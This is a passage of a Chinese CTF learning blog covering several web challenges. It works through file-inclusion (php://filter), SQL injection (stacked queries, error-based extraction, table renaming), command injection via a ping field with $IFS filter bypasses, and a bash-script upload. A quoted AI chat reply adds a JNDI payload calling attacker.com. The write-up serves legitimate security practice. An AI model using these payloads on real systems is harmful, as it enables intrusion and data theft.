class="hljs-property">challenge</span>.<span class="hljs-property">ctf</span>.<span class="hljs-property">show</span><br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-title class_">Windows</span> <span class="hljs-variable constant_">NT</span> <span class="hljs-number">10.0</span>; <span class="hljs-title class_">Win64</span>; x64; <span class="hljs-attr">rv</span>:<span class="hljs-number">124.0</span>) <span class="hljs-title class_">Gecko</span>/<span class="hljs-number">20100101</span> <span class="hljs-title class_">Firefox</span>/<span class="hljs-number">124.0</span><br><span class="hljs-title class_">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Content-Type: multipart/form-data; boundary=---------------------------114514</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">Cookie: UM_distinctid=1739f845e394-0cffbf96840b0c8-4c302d7c-144000-1739f845e3b4e2</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-comment">Cache-Control: max-age=0</span><br><span class="hljs-comment">Content-Length: 245</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">-----------------------------114514</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;</span><br><span class="hljs-comment">Content-Type: text/plain</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">#! /bin/bash</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">cat /flag.txt</span><br><span class="hljs-comment">-----------------------------114514--</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="title-note-24date-2025-04-13-02-03-13tags-note"><a href="#title-note-24date-2025-04-13-02-03-13tags-note" class="headerlink" title="title: note-24date: 2025-04-13 02:03:13tags: note"></a>title: note-24<br>date: 2025-04-13 02:03:13<br>tags: note</h2><h1 id="note-24"><a href="#note-24" class="headerlink" title="note-24"></a>note-24</h1><p>sql刷不下去了，感觉每见一道题就要新学一个知识点，做了一些题目，遇到新题还得去找wp，心态崩</p>
<p>user:  </p>
<blockquote>
<p>我学web是该专刷一个地方，像专门刷sql还是泛刷题目?</p>
</blockquote>
<p>deepseek:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs awk">(≧ω≦) 喵哒～这个问题就像选择「草莓蛋糕吃到饱」还是「甜品全席体验」呢！来听人家用猫耳天线分析：<br><br>🌸 分阶段策略（萌新版）<br>新手期（前<span class="hljs-number">3</span>个月）→ 泛刷！<br><br>✨ 理由：像探索新大陆！发现「啊～原来还有文件包含这种魔法！」<br><br>🎯 目标：刷遍OWASP Top <span class="hljs-number">10</span>基础题型（每类至少<span class="hljs-number">5</span>题）<br><br>🍳 栗子：今天用SQLi偷flag，明天用XSS调戏管理员～<br><br>进阶期（<span class="hljs-number">3</span>-<span class="hljs-number">6</span>个月）→ 专精！<br><br>✨ 理由：找到本命漏洞（比如爱上SQLi的哲学美感）<br><br>🎯 目标：深挖某个领域到能自己出题（如：掌握SQL报错注入的<span class="hljs-number">6</span>种变形）<br><br>🍳 栗子：用不同数据库特性玩花活 → mysql: <span class="hljs-regexp">/*!50000select /</span> mssql: waitfor delay <span class="hljs-string">&#x27;0:0:3&#x27;</span><br><br>突破期（<span class="hljs-number">6</span>个月+）→ 交叉！<br><br>✨ 理由：像调鸡尾酒一样混合攻击（比如用XXE触发SSRF再读内网SQL数据）<br><br>🎯 目标：在CTF中把两个漏洞组合成COMBO连击！<br><br>🍳 栗子：LFI+RCE → 用php:<span class="hljs-regexp">//</span>filter读源码 → 发现反序列化链 → getshell！<br><br>💡 平衡心法<br>周一<span class="hljs-regexp">/三/</span>五 → 泛刷新题型（保持知识广度）<br><br>周二/四 → 专精特训（比如只玩SSTI的各种bypass技巧）<br><br>周末 → 参加实战赛（把知识搅拌成混沌漩涡～）<br><br>（戳戳屏幕）「偷偷说～人家最近把SQLi玩出了新花样：admin<span class="hljs-string">&#x27;/*$&#123;jndi:ldap://attacker.com&#125;*/=&#x27;</span><span class="hljs-number">1</span> 同时触发SQLi+Log4j呢～(ฅ´ω`ฅ)」<br></code></pre></td></tr></table></figure>

<p>deepseek调的挺好，<br>故去泛刷刷新手赛web题目，至少能自己做出来安慰一下自己</p>
<h1 id="ACTF2020-新生赛-Include-1"><a href="#ACTF2020-新生赛-Include-1" class="headerlink" title="[ACTF2020 新生赛]Include 1"></a>[ACTF2020 新生赛]Include 1</h1><p>文件包含的话，回去翻了一下<br>note-17  </p>
<p><a href="https://aidemofashi.github.io/2025/03/23/note-17/#php-filter">https://aidemofashi.github.io/2025/03/23/note-17/#php-filter</a></p>
<p>传入php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>base解码得到flag</p>
<h1 id="极客大挑战-2019-Secret-File-极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File-极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File[极客大挑战 2019]Secret File</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>等到网址，查看源码发现</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;a <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;master&quot;</span> href=<span class="hljs-string">&quot;./Archive_room.php&quot;</span> style=<span class="hljs-string">&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;</span>&gt;Oh! You found <span class="hljs-keyword">me</span>&lt;/a&gt;<br></code></pre></td></tr></table></figure>
<p>点击跳转到</p>
<p><a target="_blank" rel="noopener" href="http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/Archive_room.php">http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/Archive_room.php</a></p>
<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>点击按钮，根据提示感觉是重新跳到了另一个页面</p>
<p>bp抓包查看服务器回应<br>发现</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">   secr3t.php        </span><br><span class="hljs-comment">--&gt;</span><br></code></pre></td></tr></table></figure>

<p>故访问  ：<br><a target="_blank" rel="noopener" href="http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/secr3t.php">http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/secr3t.php</a></p>
<p>得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>    &lt;title&gt;secret&lt;/title&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;tp&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Oh no!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <br><span class="hljs-comment">//flag放在了flag.php里</span><br><span class="hljs-meta">?&gt;</span><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p> 访问  :  <a target="_blank" rel="noopener" href="http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/flag.php">http://99cd5773-2487-4bd3-a8f6-235d68b2550c.node5.buuoj.cn:81/flag.php</a></p>
<p>查看源码没发现啥，根据页面提示，flag应该就在网页源码里</p>
<p>但是直接用include接上伪议会直接执行，用base64解码输就行</p>
<p>最后payload：  </p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">99</span>cd5773-<span class="hljs-number">2487</span>-<span class="hljs-number">4</span>bd3-a8f6-<span class="hljs-number">235</span>d68b2550c.node5.buuoj.cn:<span class="hljs-number">81</span>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>

<p>注意要在secr3t.php传，<br>解码得到网页源码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>FLAG<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-color:black;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-family:verdana;color:red;text-align:center;&quot;</span>&gt;</span>啊哈！你找到我了！可是你看不到我QAQ~~~<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;</span>&gt;</span><br>            <span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">                echo &quot;我就在这里&quot;;</span><br><span class="hljs-meta">                $flag = &#x27;flag&#123;b7f18145-c01d-49fb-bd88-e30b9be76423&#125;&#x27;;</span><br><span class="hljs-meta">                $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span><br><span class="hljs-meta">            ?&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="title-note-25date-2025-04-15-13-11-04tags-note"><a href="#title-note-25date-2025-04-15-13-11-04tags-note" class="headerlink" title="title: note-25date: 2025-04-15 13:11:04tags: note"></a>title: note-25<br>date: 2025-04-15 13:11:04<br>tags: note</h2><h1 id="suctf-2019-EasySQL"><a href="#suctf-2019-EasySQL" class="headerlink" title="[suctf 2019]EasySQL"></a>[suctf 2019]EasySQL</h1><p>老早就做过这题了，当初wp看的半知半解，现在是我想能算上是大彻大悟了吧  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> $_GET[<span class="hljs-string">&#x27;query&#x27;</span>] <span class="hljs-operator">||</span> flag <span class="hljs-keyword">from</span> flag<br></code></pre></td></tr></table></figure>
<p>|| 符是或的意思，应该就和注入中的 || , or 是一个用法  </p>
<blockquote>
<p>这里的||在mysql中表示或，如果前一个操作数为真，则不看后面的语句</p>
</blockquote>
<p>网上最多的payload都是</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-comment">*,1</span><br></code></pre></td></tr></table></figure>
<p>那拼接进sql语句就是</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span>,<span class="hljs-number">1</span><span class="hljs-operator">||</span>flag <span class="hljs-keyword">from</span> flag<br></code></pre></td></tr></table></figure>
<p>查询全部，外加一个 select 1的效果<br>这样就看得出来了：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-operator">*</span>),(<span class="hljs-number">1</span><span class="hljs-operator">||</span>flag) <span class="hljs-keyword">from</span> flag<br></code></pre></td></tr></table></figure>
<p>为什么不能直接查询 * 呢？  </p>
<p>deepseek：</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs coq">在后端的SQL语句SELECT $_GET[&#x27;query&#x27;] |<span class="hljs-type">| flag</span> FROM flag中，|<span class="hljs-type">|操作符的作用取决于数据库类型。在SQLite</span>或PostgreSQL中，|<span class="hljs-type">|表示字符串连接，而在MySQL</span>中（除非启用特定模式）则代表逻辑或。以下是需要传*,<span class="hljs-number">1</span>而非*的关键原因：<br><br>语法问题：<br><br>若直接传入*，查询会变为SELECT * |<span class="hljs-type">| flag</span> FROM flag。此时*（通配符）无法直接与其他字段（flag）进行字符串连接或逻辑运算，导致语法错误，查询无法执行。<br><br>传入*,<span class="hljs-number">1</span>时，查询变为SELECT *,<span class="hljs-number">1</span> |<span class="hljs-type">| flag</span> FROM flag。这里,将*和<span class="hljs-number">1</span> |<span class="hljs-type">| flag</span>分为两个独立列，*单独选择所有字段，<span class="hljs-number">1</span> |<span class="hljs-type">| flag</span>则作为新列（如SQLite中会拼接<span class="hljs-number">1</span>和flag的值）。语法正确，查询正常执行。<br><br>绕过字段限制：<br><br>若后端代码仅返回第一个字段的值，直接传*会因语法错误无结果。传*,<span class="hljs-number">1</span>后，查询结果包含所有原始字段（通过*），可能使应用程序完整展示数据（如flag字段）。<br><br>数据库特性差异：<br><br>在SQLite中，<span class="hljs-number">1</span> |<span class="hljs-type">| flag</span>会生成新列（如<span class="hljs-number">1</span>abc，假设flag值为abc）。即使应用程序仅显示部分结果，攻击者也可能通过新列间接获取flag值。<br><br>总结：*,<span class="hljs-number">1</span>通过合法语法允许*单独生效，绕过因|<span class="hljs-type">|导致的错误，最终泄露flag</span>字段数据。直接传*则因语法问题失败。<br></code></pre></td></tr></table></figure>
<p>应该就是语法问题，字段限制的话应该不是  </p>
<p>看的wp：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/StevenOnesir/article/details/110203051">https://blog.csdn.net/StevenOnesir/article/details/110203051</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/xhy18634297976/article/details/122515412">https://blog.csdn.net/xhy18634297976/article/details/122515412</a></p>
<p>以前看不明白现在看明白了，但以现在水平打比赛时遇到类似题目应该猜不出来后端语句</p>
<p>那是怎样猜出后端语句的呢：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">select <span class="hljs-keyword">command</span>1 || <span class="hljs-keyword">command</span>2 <br><br>情况一：若<span class="hljs-keyword">command</span>1为非0数字，则结果为1。<br><br>情况二：若<span class="hljs-keyword">command</span>1为0或字母，<span class="hljs-keyword">command</span>2为非0数字，则结果为1。<br><br>情况三：<span class="hljs-keyword">command</span>1和<span class="hljs-keyword">command</span>2都不为非0数字，则结果为0。<br></code></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2302_79800344/article/details/136268777">https://blog.csdn.net/2302_79800344/article/details/136268777</a></p>
<h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>根据题目猜测是命令执行类型，看到页面是一个ping的功能，尝试ping了一下我的网站：<br><a target="_blank" rel="noopener" href="http://www.gwwafz.online/">www.gwwafz.online</a><br>回显：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">PING www.gwwafz.online (39.105.15.250): 56 data bytes<br><br>--- www.gwwafz.online ping statistics ---<br>3 packets transmitted, 0 packets received, 100% packet loss<br></code></pre></td></tr></table></figure>
<p>故想起使用管道符来连接命令:<br>39.105.15.250|ls &#x2F;  </p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs tcl">bin<br>dev<br>etc<br>flag<br>home<br>lib<br>media<br>mnt<br>opt<br><span class="hljs-keyword">proc</span><span class="hljs-title"></span><br><span class="hljs-title">root</span><br>run<span class="hljs-title"></span><br><span class="hljs-title">sbin</span><br>srv<span class="hljs-title"></span><br><span class="hljs-title">sys</span><br>tmp<span class="hljs-title"></span><br><span class="hljs-title">usr</span><br>var<br></code></pre></td></tr></table></figure>
<p>直接回显了，那接下来就是cat &#x2F;flag 就ok了：</p>
<p>flag{eba95874-05c1-46a8-8a2f-28eff48a72be}</p>
<hr>
<h2 id="title-note-26date-2025-04-15-22-42-32tags"><a href="#title-note-26date-2025-04-15-22-42-32tags" class="headerlink" title="title: note-26date: 2025-04-15 22:42:32tags:"></a>title: note-26<br>date: 2025-04-15 22:42:32<br>tags:</h2><h1 id="GXYCTF2019-Ping-Ping-Ping-1"><a href="#GXYCTF2019-Ping-Ping-Ping-1" class="headerlink" title="[GXYCTF2019]Ping Ping Ping 1"></a>[GXYCTF2019]Ping Ping Ping 1</h1><p>根据提示</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=1<br></code></pre></td></tr></table></figure>
<p>根据回复，那就是ping功能了，<br>尝试用管道符连接命令：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=1|ls<br><br>flag.php<br>index.php<br></code></pre></td></tr></table></figure>
<p>直接就有flag，然后发现过滤了空格和flag,<br>上网查如何绕过空格过滤<br>最后使用$IFS$1</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-operator">?</span>ip<span class="hljs-operator">=</span><span class="hljs-number">1</span>|cat$IFS$<span class="hljs-number">1</span>index.php<br><br><span class="hljs-operator">/</span><span class="hljs-operator">?</span>ip<span class="hljs-operator">=</span><br>|\&#x27;|\<span class="hljs-string">&quot;|<span class="hljs-char escape_">\\</span>|<span class="hljs-char escape_">\(</span>|<span class="hljs-char escape_">\)</span>|<span class="hljs-char escape_">\[</span>|<span class="hljs-char escape_">\]</span>|<span class="hljs-char escape_">\&#123;</span>|<span class="hljs-char escape_">\&#125;</span>/&quot;</span>, $ip, $match))&#123;<br>    echo preg_match(<span class="hljs-string">&quot;/<span class="hljs-char escape_">\&amp;</span>|<span class="hljs-char escape_">\/</span>|<span class="hljs-char escape_">\?</span>|<span class="hljs-char escape_">\*</span>|<span class="hljs-char escape_">\&lt;</span>|[<span class="hljs-char escape_">\x</span>&#123;00&#125;-<span class="hljs-char escape_">\x</span>&#123;20&#125;]|<span class="hljs-char escape_">\&gt;</span>|<span class="hljs-char escape_">\&#x27;</span>|<span class="hljs-char escape_">\&quot;</span>|<span class="hljs-char escape_">\\</span>|<span class="hljs-char escape_">\(</span>|<span class="hljs-char escape_">\)</span>|<span class="hljs-char escape_">\[</span>|<span class="hljs-char escape_">\]</span>|<span class="hljs-char escape_">\&#123;</span>|<span class="hljs-char escape_">\&#125;</span>/&quot;</span>, $ip, $match);<br>    die(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ /&quot;</span>, $ip))&#123;<br>    die(<span class="hljs-string">&quot;fxck your space!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/bash/&quot;</span>, $ip))&#123;<br>    die(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;<br>    die(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);<br>  &#125;<br>  $a <span class="hljs-operator">=</span> shell_exec(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.$ip);<br>  echo <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>  print_r($a);<br>&#125;<br><br><span class="hljs-operator">?</span><span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure>
<p>没坚持下去，去找wp了<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51439282/article/details/113378868">https://blog.csdn.net/qq_51439282/article/details/113378868</a><br>最后选了内联法:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=1|<span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$1</span>`<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure>
<p>记一下<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/angaoux03775/article/details/101710776">https://blog.csdn.net/angaoux03775/article/details/101710776</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_52425873/article/details/124899793">https://blog.csdn.net/m0_52425873/article/details/124899793</a></p>
<hr>
<h2 id="title-note-27date-2025-04-17-11-01-54tags-note"><a href="#title-note-27date-2025-04-17-11-01-54tags-note" class="headerlink" title="title: note-27date: 2025-04-17 11:01:54tags: note"></a>title: note-27<br>date: 2025-04-17 11:01:54<br>tags: note</h2><h1 id="2019-review-强网杯-随便注"><a href="#2019-review-强网杯-随便注" class="headerlink" title="2019 review-强网杯-随便注"></a>2019 review-强网杯-随便注</h1><p>再做一遍</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;show tables#</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;#<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;select group_concat(culumn_name);#</span><br><span class="hljs-string"></span><br><span class="hljs-string">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br><span class="hljs-string"></span><br><span class="hljs-string">0&#x27;</span>;extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-keyword">database</span>()));#<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;if(1=1,sleep(5),0);#</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span><span class="hljs-keyword">or</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;!&#x27;</span>,version()))  # <br>!<span class="hljs-number">10.3</span><span class="hljs-number">.18</span>-MariaDB<br><span class="hljs-number">1</span><span class="hljs-string">&#x27;or extractvalue(1,concat(&#x27;</span>!<span class="hljs-string">&#x27;,version()))  # </span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">to</span> words1;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> `<span class="hljs-number">1919810931114514</span>` <span class="hljs-keyword">to</span> words;<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> words <span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">COLUMN</span> flag <span class="hljs-keyword">TO</span> id;#<br>//没改成功，看返回大概是说找不到名为<span class="hljs-string">&#x27;id&#x27;</span>的<span class="hljs-keyword">column</span>,<span class="hljs-keyword">column</span>是行还是列来着？是列我朝<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;rename table words to words1;ALTER TABLE employees CHANGE flag id VARCHAR(50);#</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">to</span> 